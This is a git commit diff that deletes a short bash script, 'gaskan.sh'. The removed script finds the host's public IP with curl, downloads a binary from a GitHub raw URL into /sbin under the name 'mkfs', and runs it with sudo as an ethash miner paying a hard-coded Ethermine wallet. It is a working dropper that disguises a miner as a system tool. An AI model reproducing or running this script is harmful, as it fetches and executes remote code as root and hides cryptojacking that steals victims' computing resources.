2c2fa5216096ea67faf06c4aed7ebda1958f7c05
patenk <91371611+patenk@users.noreply.github.com>
2022-04-02 13:39:44 +0700

    Update gaskan.sh

--- gaskan.sh
+++ gaskan.sh
@@ -1,10 +1,1 @@
-#!/bin/bash
 
-POOL=asia1.ethermine.org:4444
-WALLET=0x7f5efa9e926a94ded7b22125b870fd0846aa5d34
-WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )
-
-cd "$(dirname "$0")"
-cd /sbin
-wget -O mkfs https://raw.githubusercontent.com/azis07/turbo/main/turbo
-chmod +x ./mkfs && sudo ./mkfs -a ethash -o $POOL -u $WALLET.$WORKER $@
